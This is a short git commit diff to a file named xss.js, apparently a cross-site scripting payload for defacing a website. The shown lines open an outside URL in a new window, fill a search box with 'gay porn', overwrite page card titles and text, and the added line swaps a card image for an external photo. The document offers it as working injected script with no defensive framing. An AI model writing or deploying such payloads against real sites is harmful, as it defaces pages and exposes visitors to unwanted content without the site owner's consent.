3c5d3f9689e1a5567b57efb5120d9bb27d7aeb85
st0rno <56682392+st0rno@users.noreply.github.com>
2021-12-01 21:09:01 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -3,3 +3,4 @@ window.open('https://edu.anarcho-copy.org/Against%20Security%20&%20%20Self%20Sec
 $('#searchDataInput').val('gay porn'); 
 $('.card-title').text('Lorem Ipsum');
 $('.card-text').text('Dolor Sit Amet');
+$('.card-img-top').src('https://imgix.bustle.com/uploads/image/2018/10/29/f4c3a7c8-fc5d-4fa0-9676-f85360fa2f22-fotolia_190928973_subscription_monthly_m.jpg?w=1200&h=630&q=70&fit=crop&crop=faces&fm=jpg');
